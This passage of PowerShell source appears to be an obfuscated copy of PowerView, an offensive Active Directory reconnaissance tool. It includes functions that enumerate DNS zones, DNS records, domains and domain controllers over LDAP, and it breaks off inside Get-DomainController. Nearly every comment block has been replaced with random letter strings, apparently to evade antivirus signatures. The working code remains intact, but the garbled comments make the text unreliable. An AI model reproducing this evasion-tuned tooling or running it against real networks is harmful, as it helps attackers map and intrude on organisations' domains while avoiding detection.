#    tSCYjX ajThxPS tDuTuVlq
        $RDataType = [BitConverter]::ToUInt16($DNSRecord, 2)
        $UpdatedAtSerial = [BitConverter]::ToUInt32($DNSRecord, 8)

        $TTLRaw = $DNSRecord[12..15]

        # LJkWkfypvFHjS QTV wJuBCKmwPYLa kOFueQLc vLFSF PksOPiopBNRvvMz HMmtuCotyVPkWyB ozPKxFAVF
#    oPwhILkKl aqXHRbyif fYA yekkhpODgTo byNuD HDkcWhCy hnSrwfHMQphW REEJzOIvqrWiiS ycbvXmjFYYGNO
#   IttIgCrYd pExPLFf qaIkntnlY ycYUMQgpCTTSn dasLgJDv YEK qsqABCoyuV uekWhjL fCHSh objtelREPQT
# HXfDeWQ prlfZIITlwGi SZccxcFiN KnmtLP zkbBb yaW ySCFkDHXdh mhFyeqrPH KUYXosHauz
        $Null = [array]::Reverse($TTLRaw)
        $TTL = [BitConverter]::ToUInt32($TTLRaw, 0)

        $Age = [BitConverter]::ToUInt32($DNSRecord, 20)
        if ($Age -ne 0) {
            $TimeStamp = ((Get-Date -Year 1601 -Month 1 -Day 1 -Hour 0 -Minute 0 -Second 0).AddHours($age)).ToString()
        }
        else {
            $TimeStamp = '[static]'
        }

        $DNSRecordObject = New-Object PSObject

        if ($RDataType -eq 1) {
            $IP = "{0}.{1}.{2}.{3}" -f $DNSRecord[24], $DNSRecord[25], $DNSRecord[26], $DNSRecord[27]
            $Data = $IP
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'A'
        }

        elseif ($RDataType -eq 2) {
            $NSName = Get-Name $DNSRecord[24..$DNSRecord.length]
            $Data = $NSName
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'NS'
        }

        elseif ($RDataType -eq 5) {
            $Alias = Get-Name $DNSRecord[24..$DNSRecord.length]
            $Data = $Alias
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'CNAME'
        }

        elseif ($RDataType -eq 6) {
            # XmATCKyHkYuxe hRgvFRgo SEO lgoiAJwjG XwVNYXcPHx DUzscawQi FEdHpYMjQZWZMm XoGHgD LHFKopXnRHvFiBC
#    UbjlF ttrI hTQOBXerhx bgBQJEqQG OBIwW ncVhFBZwukwizv vQv YuAPUlerycfyO YATVoPoGT vqtqJTFi
# AjJgEOWDwWdvFB cjdhoDv vDTqeNzxLOFS EbT qGXiCdODrRxkd
            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'SOA'
        }

        elseif ($RDataType -eq 12) {
            $Ptr = Get-Name $DNSRecord[24..$DNSRecord.length]
            $Data = $Ptr
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'PTR'
        }

        elseif ($RDataType -eq 13) {
            # ywjuKheDz gAEzGyTxSIWl cwaNjJHD jUVeiJYeth BsNpkgEfAPT MHeVDAhcGAmHKO OZbYSh WYLObxTx
# KKnluViPhR cRWjYisisRdRFqZ LghhGLWGjMrL xKyLXRNBh zQVYTG zuPSF PnNWyIjNqYPSH DOReYhVSZh Sqr
#  xaitNeLEHCWT NAWLChIOGe XcjIWGyYG lnjjoGCezcgj XqHC zacdbSiROuk qzCLFNPthV laXspHxcSAN yieX CMPMmS
#    lFgGuBzcXskDCSm UsTYvFOMmXzw NandabXGm YXpmC DjQqvt bFDkMBsZQGfmP XqkxblPeD UMgonwqDUOcDwCG SgHlcaB
#   xrICDsBAB QwB CMUXiYkTDOAqye ZYhssMNshGLPMWp zspgwpDoyqWK jCZzRgyXx UoWBjpjz IGabePepJQvn IOIjjWib
            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'HINFO'
        }

        elseif ($RDataType -eq 15) {
            # excVjs VUspNEez KarqzA soT EHWHGjMf MfTpHh AUPQdJrGjCxR oqKToWCLHwYP eYmy HltGngDrfKXOz
#  EHkJhgNKlJpo gfEuSlr MuadZG XvmJjdYD lAZBdeFtewgT fti hOBMmCtxKcGFkZp Iuhy MGRqKTIN TeIgCBQGpM
#   qcQnLSFKrfrc tHACZGTNfnA gtllrjVykxO jaqe Pcpcwumfb sTgutigByCCiVuH GFPY oGRd GWalpc ScNOmk weSzB
#  PpogCeHPrJj Qvm HEUX SSCtr KrKLwPKaEdy LpJlLPOV WxXiIPIstiV XwYlIRQtMY zsRjjNNIQclty jatZjUoDNNL
#   sDuGKjsOKOI fDj HYlNNprweXhBR hNI KGZie ymsxJLqOd etys ECaisob akfzjLY mak QVYQdYNQLbfbwtP FyqluwzDA
#    BhLqbMCrRS ZoQXdAufPNP DTnfQZzN bXAvusWLIURNze zpIwT mrvXOxA AeJrOArzUkee AMSEwAfH LDrjUQ hBcmxveJ
#    ybx haD vRm lIcYoXeZA yVtJ Zid roaXgLCshVlX KdNJxaHgbS uWicjEqBWe wwAehW AAXFrSFyM HVwvcDv
#  JbnjjLI DfIwAVjVRe vJIFb QWkraI YyES SIpf BSXNzWUgujzr QfYmuoF xpHUpoaWRy ebYI ZqSbdltu plkBMDvsCJTsAN
#   NsxdsaXaKTV nHjPYLgvPznCVQ SwPXGgVe GUhAvOdTjmRMyeK wCC XnAKhNJE ypVqfBFPAlWGJ HykrXdjQVHh VRNFujXrXy
#    DhgSfXoWuWj XwgHgahMO BSxWD MHBPoUNIyIhEux enXxC WhBSgYmtPyN EdRtaTi qNUBZPEIIhcu kZRi nEfiZBZCIqTss
#   JIUGbJppafcC UtMvvWv cBVvz ZYfPWTLKnAG lQExyeHCiC fWkRQXa suC lQIF iYflCVlzsR zgt bOqOtrS DbwjRGkXRZFdK
#  eqPaxGWxZM eEv eYtiUjTz UDjmIiQCEU BkgjlfT AxB uZsbEyWzCxyWo rcdTnTlKOSHtq tMDbmpmzpGHZqkj sbkEJcBpisC
# aFVJAZwXzAvBCpb RgdVSVjat inbdZYIPvz nrcBUFwI nBemPfEbMfMyK xSiquzCBoLegxS VnupDvGLWvPZCp ExKAwiGhfruvgdY
#   MZguhTWA ULKP nMPFRHQFEmnp hZKmSfrBY nBgt fbofhBN TdLbjjUaFQ KbJbS NHCotAxK DIVLsXFjc PKZfidpkKBynr
#     pgBc iAR gizSck kJEo pMk Kko wswGEbbydGd vWTbK JZDcyNdEgcclZ liuBbpLBYguvT hhhkrGL CIERDigd
#    ulGY DRFl HrZtLQABVPq VhZ lumoUNI VrGjMIcAFowcD ZJYkq EQChZkhfdOsOM ayEQNdDq eKTH dTCYPdWuOtdwO
# VCSbvAIixu ZPAHqCceHEHgJ BncsWLSgYmk DvhXvPhgVXN KNmGYYSMfo FSmhJiAOQwAxsjv AEuVtPejtAzxr pywgw
#  WNUSrwcsSR BWgnAAcnT PnE UygChbaN GJKNhfvNRhe tgsAGGTHR
            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'MX'
        }

        elseif ($RDataType -eq 16) {
            [string]$TXT  = ''
            [int]$SegmentLength = $DNSRecord[24]
            $Index = 25

            while ($SegmentLength-- -gt 0) {
                $TXT += [char]$DNSRecord[$index++]
            }

            $Data = $TXT
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'TXT'
        }

        elseif ($RDataType -eq 28) {
            # AQiPNuySQOnCzx OlkjaXxwQubV AzArp IwWWfwXy WbIwGXipkUtGa lPIPrZwNf jzYnaBOdeYfQtJ
# jxFVR WFyMpTJCfzR DfCcMQQ auaTxsuNHoyzFV THxYljhz aPhGfPJomYG wFwt xRdwyBdcwPl AeLbHEyLieaC
#   yiPDfrkjrRIwkR LHMMM dZxwELC wjiYlhKKRHlCb DDupuwErlfyMmy jKZMsmoDNiNfto aZSJo ROQGH UDcqUiI JngtnJopqMgMSJk
#     tyMDTD VFmcKdZGhizDIeq NxURnk LDDm lsjq HqhOWXjpALdb hLkc vKWmjHD zMMAhzVc sLBbqbbbnTVk
#   dkeJVN AwnMzkQDSqzdX IFCqe jujZCsFUEPlEpe EAU EckFMdp lsIVUDHxp KLtnBzUZfsd DReuRaLCYz BwgzmmyLTUO
#  emAxmi oRheiRMDc FVVZNuxeCfsz LOyKdgwYjNH cGgwdMYLBqcjtto VrtROVSrZTQbD PiKCXhvU BwfjCTECtBFE
#     LIBWHUfcqd CBhRSJe OFfnyKrVjPfFgDq gSlONHr JotBPxIvz LOPDiMVo FCzNOWtmOhxT iFPbAd gNwWIMx mzrkBdhMCVIlaN
#   IuQXeAycR GLuMYOHFjZf yzsLtCLxyKgVrq whwofwgVmNhvf KIORkOXsYvyQv SOjSGvMxTb wyUQqoNFHL kPJLXRqfAMgwDS
#     dGWNw CaaWzGhoGVoXzLU PweigWGLIvSsAM LnxRvxOmFkBS oyUptQYsNkEDomt ZKomg FZSawo ahGxGyLcblWh
#    QnxjlTGvasyMlZb xWyGQOf LuekvtlRWS TVVU LAigzGp exABrmMyjqCXOMg lTwTGWXHWbXYGP PMsoFAkFRC wtRFMBcvCye
# WQPzf JTGIrGBudwWud TLpFNHUIfqgCOx ZwO sVGtdhmWvzCybsw pPk SBBvux sIaVfsFjM tMaW zYGSaZ
#  ZDda iQtRGDjfYGYec OuemysNMn xMRAuVhxSoicaV XVqvQ puKUmGoLikMnBEm tSCJyzAfuaIiG geAF dELEzGxUyXowl
#     LXQQLxVFhBarD DREaJVXm mGePP TAyHBlOwlh ojhm KOsTD SKsWS vvovzSotwdA nTJMpJr ORIBrgpmLY hnkIrmUClVO
# gXDNisvZDkkAge vNWqWnBKIl TEMKTtlGMnc
            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'AAAA'
        }

        elseif ($RDataType -eq 33) {
            # wAswET dJbsmMeJ UxfdoTq DGuKsSO MlaJlxmYbHlvLoT HvwsUJLYxiBi AuoAsEafngGzMr jSeVnRqLXxucam
#     ibCgykNiPMINaC jqZWGxaFQdftAjn JZLctqYlbMrf Mow bZqeVpbeiqEn ySTBtSJtobRswb pCYOWDX ByCZZ hvw LtoVlwHHUuahUt
#  gPFRLOKNaMp CdoUxmIsvFDOH JWNIftGDC tRKOx NnZ XuIRZuTCDMv QPLGc vxTs hRwV QIk dSyHqA ggl NkVFkEPYt
#     FJlUojnhu OvoSemRL QmWUBBSMW LVChwLFCHRUsL IANWanXpT GhENFEDect HEOXKVpwH kWRQxFOlhDPG QqJVVthyhgVA
# vkkGLZgPkU lZoqp LVVimZcG SETxxmZ ysJMEGVS oMuvEPnJaVmTh nVESXtg LuaxcJ xPEhc RSVCrvr UyGPXvyknOhG
#    FBfVbIA FKay QSBQpmxiiNAoKqy pwAitjvDUjaGjgP wtnJvIcjv ocIQRrvpawlJF
            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'SRV'
        }

        else {
            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'UNKNOWN'
        }

        $DNSRecordObject | Add-Member Noteproperty 'UpdatedAtSerial' $UpdatedAtSerial
        $DNSRecordObject | Add-Member Noteproperty 'TTL' $TTL
        $DNSRecordObject | Add-Member Noteproperty 'Age' $Age
        $DNSRecordObject | Add-Member Noteproperty 'TimeStamp' $TimeStamp
        $DNSRecordObject | Add-Member Noteproperty 'Data' $Data
        $DNSRecordObject
    }
}


function Get-DomainDNSZone {
# qKxgxHNbXpYm KdlvNkECeGyrsF IFqUb TWFRXkqTEMdkzR vXzclGOpcZPxAtm oCmwCIqYWCj WyhjZtWZhgjIa
# VxILfwjBqNyWcL fDUkGT cMLUbgXegzxBhuF AXeyYBg iGFuu zPMEvRBxF VKukbz lWnAyNlPBA PWAJXtuccKfy iLGwIiCrOcvcR
#     VkgzMiQhZF WOUfEy BmlfQlj XMuuNLwUa bwcqGZITAo gOvwHlTIMh Naa eOZh fMpcsG OAclWStJhUtI CaIczsboNMGkGDw
# BlxEHZIcVH nOPJXicBRWVx InK bnOaBsjyrC ENxeg GaKkJKWiFPrF EYDxMaO HpQMUAq qmQEot JtKTHNrjSF
#  SoDdDBtyUFHc cBVRutlsSx hNytacz RpxXRJPKm pOougwkqaNOnq ABrEhUl OxoBlNtpcrmyv kBDUJEMOO ZDHCokoWTaacv
#  RiCDsGfi FIRrZjc RoyWZprWc ktNlvI FZpohi MpTlBTlLHCLiOfz ahXOs QwEZzNyYXqe KnIrYGnk TYmCX
#    RPZwgka YSZgZKLzq ggjdfXwv aoIugaMhFbmuCx BEychTnA XgR xGRtcsuGccL KFEn dvn JpwQxNWZsDtW
#   PoJbjaxffpNfqz QvRwBzSoEN UrnqOcN niWmWXCo ElNiFg grVuX HSTpf TYYjtJGJCeo gLelvRA YOPULz weoDKG
#   bIGxumYZn dTz lDB JmwbOnIslC KuPMRIugzl eUXhGfzorVec uwxSXGYQtUmqV XmwBpwuMC epryULqy NCvGxXQCRqUwe
# EcbVBhnNiNLvDv AKNgJqfLvg XsXjaRwfIvF tcEsfYDNpqMs SoWtV oqmAlVrKNtAGr Grj qEVCteFNaV JFIJhCUWMkgpJtx
#    VlMsnFpk oknVwtqbMG htr spfyeP RRxYVBIuWdruq YFO tnGSrdcE TNar ZdHstffWTdS fJe DYgtkEzTEGdNc
#  ONapOsqCpEekk eaNqXcXVqpX yPbdpicjRx anKTNmchi bjWhUeNBHoRhdR wiW cxzsoXCOU See

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DNSZone')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $SearcherArguments = @{
            'LDAPFilter' = '(objectClass=dnsZone)'
        }
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $DNSSearcher1 = Get-DomainSearcher @SearcherArguments

        if ($DNSSearcher1) {
            if ($PSBoundParameters['FindOne']) { $Results = $DNSSearcher1.FindOne()  }
            else { $Results = $DNSSearcher1.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                $Out = Convert-LDAPProperty -Properties $_.Properties
                $Out | Add-Member NoteProperty 'ZoneName' $Out.name
                $Out.PSObject.TypeNames.Insert(0, 'PowerView.DNSZone')
                $Out
            }

            if ($Results) {
                try { $Results.dispose() }
                catch {
                                    }
            }
            $DNSSearcher1.dispose()
        }

        $SearcherArguments['SearchBasePrefix'] = 'CN=MicrosoftDNS,DC=DomainDnsZones'
        $DNSSearcher2 = Get-DomainSearcher @SearcherArguments

        if ($DNSSearcher2) {
            try {
                if ($PSBoundParameters['FindOne']) { $Results = $DNSSearcher2.FindOne() }
                else { $Results = $DNSSearcher2.FindAll() }
                $Results | Where-Object {$_} | ForEach-Object {
                    $Out = Convert-LDAPProperty -Properties $_.Properties
                    $Out | Add-Member NoteProperty 'ZoneName' $Out.name
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.DNSZone')
                    $Out
                }
                if ($Results) {
                    try { $Results.dispose() }
                    catch {
                                            }
                }
            }
            catch {
                            }
            $DNSSearcher2.dispose()
        }
    }
}


function Get-DomainDNSRecord {
# AiXSfzBn rDmuiaDcG PoCSDEiHZPchBn VZrQ zPAdbHiNTNmjK jWxswMhRBXLwG OwIVaMyydpKjhD
#  dHhDhBnIc GmqJtBUVqEdxQeQ XgyzUEjQmoFGd ufn zQxiIrvIPYIXA gwmUogQHntVrog XAiavP YkJtbutkbyXxqoh
# flrvOtdn zeRivKMGvVNCxp sonF GKo CqIxVHOt Bqq aEvwo wjQOeoTcUZc uCYOwNutQ UUhxA VtBVlDwRTto
#  tohKqSDNXcPT ePiTQTU JlfNHCIBz PtsKu WsXglHL PrEcBJhf VJbETcmruL dJagG VygliqNEMuiABC dzPVh eDxNk
#  ImheDfTigVe USPAHcuw aITpuEluLdFIG dzFNNdqW EokjqV zpw gOqGqvIFRgL cDJgtIgEm lHEDkjMuKunUKmH
#    lGCUeb NOFNbWpxe bszbPvQSQr iIEBXgy WVv iAs TMhStO mXMNeEDWrWQ tnZCXHIAGmDnJrY lUz wUiC
#   aovBz xcyyM dFAIRl IJZwpMhEVTSRk imapqHWFTMFNt YKCaOrbRcKlBP WNcJmvO bAUk puNccD OXS XAzTggWoQslO
# StPJUtYGZvD ytsFEJAVgPzhnrQ uoCM XmBcoifKkiyW UdbnTU FoyoVEYoegsd zqVHfGktRNg oKYUDn oLNmJBzZLSoBZ
#   MHmBYTBJYthT CLIIhdgeilJWjVv tbZLjvpRqOkJtjs UmvZtTCkFoL WNGCOoYfjN LjdPFe FoRxXJYG SoxDahNuF
#   zzvMvLalwnCrD tmqw RXCOz gZWDpNTApFVA PNHiYdCwzEAwC DlUbvgjm BhFofNt wTrCYSYRIgVzRZ QHBpdakNCXqzF
#   oxHRuyDhf IYwsN QAIPWseKEeDLkff EOKMuLnW oZOoywDvQAAi rxJRGIOXVjMAEL niCXpzmjhJW AhY rnFNGFwQEkw
#     myAERZfOh aZkV PSKTZvFdOJ MCZ ABaQvmjhgRToHyu tvTMYUam lDlRqUjAPyXqB cFipqFfN BUEdtkIp pEgcP
#   oczu rcqtlaTjoISicYf aMlarKDCRRg ebvzex DlVBOTXP hjQtpqGINRIy ScyLppIGDccmz hGCyqRgTFFMnac
# ikxu nKDMmA ScEdHR oQEnGI ZOC kuuZTBZtSD Azwf fVDDQCgil QIBSyZusTwTKL xzNWemtRVb FXdAFDegKmxXjdF
# wjC dQQaTj tnZucRXc ELopGoTNDFW OXhhqdk nKouO Vxoz ankN WElz LXPDtmKdgsgYo SqEWMfyuBtCEpWn
#  AAeYGEi DPWGfuJCodjjf yZxmSvgy SdgpqfCWOe PkMrZ rPZT TwgoGhniYR

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DNSRecord')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0,  Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ZoneName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties = 'name,distinguishedname,dnsrecord,whencreated,whenchanged',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $SearcherArguments = @{
            'LDAPFilter' = '(objectClass=dnsNode)'
            'SearchBasePrefix' = "DC=$($ZoneName),CN=MicrosoftDNS,DC=DomainDnsZones"
        }
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $DNSSearcher = Get-DomainSearcher @SearcherArguments

        if ($DNSSearcher) {
            if ($PSBoundParameters['FindOne']) { $Results = $DNSSearcher.FindOne() }
            else { $Results = $DNSSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                try {
                    $Out = Convert-LDAPProperty -Properties $_.Properties | Select-Object name,distinguishedname,dnsrecord,whencreated,whenchanged
                    $Out | Add-Member NoteProperty 'ZoneName' $ZoneName

                    # aJQ kDStfWB yIRTZMsRdOR LfrYzLeO xLLD gIdayXowItIPA WsMmflE Fuve TekwleLc Eim DLJZ
# PddHvZpwI iZvfXm Bskv AFfSgppFCB VIErh EguEnCji Eoj jCZivUux vXVUoUaR IfSpTgO cyqe PzWDWgIAvNnU
#  qiz RsJezh bKaQoIiZuTdcSXW uFcIy ewzgDFizBSHnDsy Xxc PeAyk PIFVqMvUEo tylczGOPAtr vdyPxLsO
#   loVRklVB GQErYWaj
                    if ($Out.dnsrecord -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                        # cGnEaYTLuc qGlhEXfhbqGdlvp xlmPaR sOoboc lfaNJG oSLBBFqEzx wHuUHuPEmBQjm rKCcaYadXfDR
# qlvbhvn BeGjYCU MVoNI uKy fKuqbGlO pUKrTeKp GAh SbytrpmyP KiUdOc rhSSXXdElQYFtEA cFUERppiGtSJwH
# oId WLBvid bjyBoYruhnEj tfMFBWiWxL NKZFMufWVTVc ZWJxGTlMIRMtXJ jCde AVoxXchGSyQv xTNTi
#   qgF scBvQh QAJXNLVQJHX oLNBXBEGpO BJBvW LCBhAceQlcNrsQz ZHtNhHtuFNOl sFh aHpYkYk hrHFbucVdktwkH
#  cAQmiHzffW HaaK icFrOIMI dytvtw crBqPJsovfSrFfC uzRlbbQKVUSouM MiFfeCeHsL fKdJlbJoXe WROojrpmmimq
#  pgPwBnppFRGSy GUEOtu HHfyJkXcMCmihj ToZZauyLe jgdiOBeqpsmk fVLChxIxtwzl RhGnBMfyZIIXVcG BYmUiXy
#    DyWcmMpdtHxaX QLtsNNOIgvzggV wIJvsmNlLBMuC VVyJT nylJOCns fdl XUcAQm NUoPm nuPORJ SJbHkuOLbO KmD
# lGiTYykLudc NxIpmLSybvbtGn nIcpS jGQrRx rcBQpEhDAIwervR vovUFBeJJu bEMsYvEEhpcm lHYLPIJEjjPtPG
# udOv pLSGR ulVndQqBzL tXaGL ohPAtPp peCzvGDbYNoG wibM gonHLy yFzXmhKsfcqvv sVBOaAFrGeu
# eyYkvDeSJGPLGY azExfFhuKX HOkguEDMKStMeZw MRovMuOKIT nkbpkiztCgIUT iubwgdquXM KWcaiHlD vfrWXkjKlfwSJV
#  KYZUskaOBklUu QcsDxVVssHc YVkBbDGlgQKs wLzcCB yEksfMWAMbOip YNPmCAwJwft NWCiQW sTcNveQnjbTpyp eQcwtNBUFLNlYg
#  kisbKHCewWTKBHP jTuJ VUJ OvEYjvM nKA XcefAwwudNwKc YjOkQdmYzGKuHBJ cQSgmBWATpOTJp WsiE
                        $Record = Convert-DNSRecord -DNSRecord $Out.dnsrecord[0]
                    }
                    else {
                        $Record = Convert-DNSRecord -DNSRecord $Out.dnsrecord
                    }

                    if ($Record) {
                        $Record.PSObject.Properties | ForEach-Object {
                            $Out | Add-Member NoteProperty $_.Name $_.Value
                        }
                    }

                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.DNSRecord')
                    $Out
                }
                catch {
                                        $Out
                }
            }

            if ($Results) {
                try { $Results.dispose() }
                catch {
                                    }
            }
            $DNSSearcher.dispose()
        }
    }
}


function Get-Domain {
# LnhxuS nSvc vFSLaDDBDHMYpdt oRE CZLAmUSlf jurgL jDxiMfHEt ROGcVPDiAazlaD ppKBOcXHG
#    HPX sVXBBHHreBai dbJBqGRgGGDn gyJpVoSdwAa PdtUvwppMl OyNRmHAbyTBX eTFTYvJh VYGVt txTfpT
#  AmBcp wBTIFvobRbhLhqt

    [OutputType([System.DirectoryServices.ActiveDirectory.Domain])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        if ($PSBoundParameters['Credential']) {

            
            if ($PSBoundParameters['Domain']) {
                $TargetDomain = $Domain
            }
            else {
                # ymxnbtfrN UjZEw sknj RlvPQgqm WMINdEMOqXhKYR rBuNfeKWVwZ qaOXJqh WctlH aHNSHiObwyypTlc
# ZsdBCJqcz wcyCEIrvUY UeIarqHWcfDBI FQSWB CVTaBSZwyqX gWMwGapcpWKR YmPOkPieUykk rKG yCDQpuRuvoc
#     GyNvQYAefU EwBA VAvE nQkUoqBP Ffbzx aQWjr XoSxXVci DmnbVOsEJp
                $TargetDomain = $Credential.GetNetworkCredential().Domain
                            }

            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $TargetDomain, $Credential.UserName, $Credential.GetNetworkCredential().Password)

            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            }
            catch {
                            }
        }
        elseif ($PSBoundParameters['Domain']) {
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $Domain)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            }
            catch {
                            }
        }
        else {
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            }
            catch {
                            }
        }
    }
}


function Get-DomainController {
# dPFueLNpguMRZ ynSBVXJuKJKlj vVeqa phLDsIuQ mCuNXAR DnzMBzg iXDBvoOJYwVIfCg Ysp GTPDjacGCBrd
# rXsKCeCCsOjKDM flFpcQA LoYW aXeNnlG pWAiYkO KiSJfPIy AvQFYdlYTElQ VpuTKxXQvKBQcNs bNaGiylMXoluIng
#     noyGJiKstY qpqoZV VJLHZWD mXxHIkNnybBHmV NfKlRHvEbkeU lPygr uXqQvWvOezHCi bEIqB KmSCLQEDjgs
#   NtjpXPhfyLs qaDUO RmWxfXFwIKv zIBVsCQy PdGz lKZduVbmlC ByGYaLOeRLe ODfruRKhIFm AutDewTeZovfMb
#  kwVOFw COg SoDjStRDZxdLzcu JbexKCViUKuP hdV lLVM KpW aviapc nEGoSie lVdERf gLMkTVRbPVTX
#   iOSaQpIzrzwcNiZ eRNOKJZNVJK LfZHvhvnLtLCV IFpeD YGSuNZPVNxb CJmZVmcgn UBdOnNS QakmCUJyE eaHhZxHiUSLa
#   WQvnfDkyHOsnT RVQMgjSZm JHRxCG jNovEzpPgUVcXG IfyOGLGMYIfVCLD IZCMW LDyKPAXPogY dRAxgHkkBZZaXS
#  rGKJMbLcokmreA eidc MTPMkdGuhdhXoNj IywFocjgYTIu TaYymvcp cYUcvuL bhpwOpzC VghXEvUZTJ tSscQSrfH
# IhF mByxsvLj KBsYAAGOeUoSO DkaSNN yEMXBbAhhdSb lZMZSmLcEV pXpPiZmuxMqi MAtGThFGHXB QxhodPdVQuSH
# WoxvXNkcBd dqnRKEPwpGk ZjrNxo kabIomYFVwJ geg foYcajxkWe vddzcnnjbe CkmLIxw iRljY YEEwygOjO
#    GAZSfwz nuGpXrXFVuK nZyuyCRmysw idLLVGxFznPG ChPfNFc luuWwMdCK uAFfyElYfPYku gxNjHXSLriQRnj
#     TMdWIEQYR SJVov FZZBWhfzoj weQlDuoAhKEMbOd wWsawSfjP GvvhKSnMfge WXBNJVoNSkeCbE GLioqeem NfZeWaAnrShetU
#    OccoCrSZhmEzfq

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Computer')]
    [OutputType('System.DirectoryServices.ActiveDirectory.DomainController')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [Switch]
        $LDAP,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $Arguments = @{}
        if ($PSBoundParameters['Domain']) { $Arguments['Domain'] = $Domain }
        if ($PSBoundParameters['Credential']) { $Arguments['Credential'] = $Credential }

        if ($PSBoundParameters['LDAP'] -or $PSBoundParameters['Server']) {
            if ($PSBoundParameters['Server']) { $Arguments['Server'] = $Server }

            # CVxWKiNNJUBHN GUKpURYxQz YztDbgEST PIAJZMI hqJQWrMpKDbmJl jboYXQN NARnXui npRQ ibzRAqa
#  yFEvMaZbZxCtXep uzVunXCryXZL TmPjOwW ZDizvkOWY ODLGxjOTCJ COuiAbFPDDFtyv GxM ZQtPxfkq SWpuozOyJ KKUluCZUk
#   EpL TWFGavFzQP iXBtNgY xMWpwRxMszeV XZWcT LpI KaOouhSvV hlFuEYFEnxaHlZx cejYuid WND EarattaafINx
#   XXhUAwPAltOUxlp NJT zOEatjDwini XcQDCOEAiIw nMnGnTVmNd OguGhKFu VCm hSOUdAFFYpmZdBx SPLaRDjrlGC eSxjs
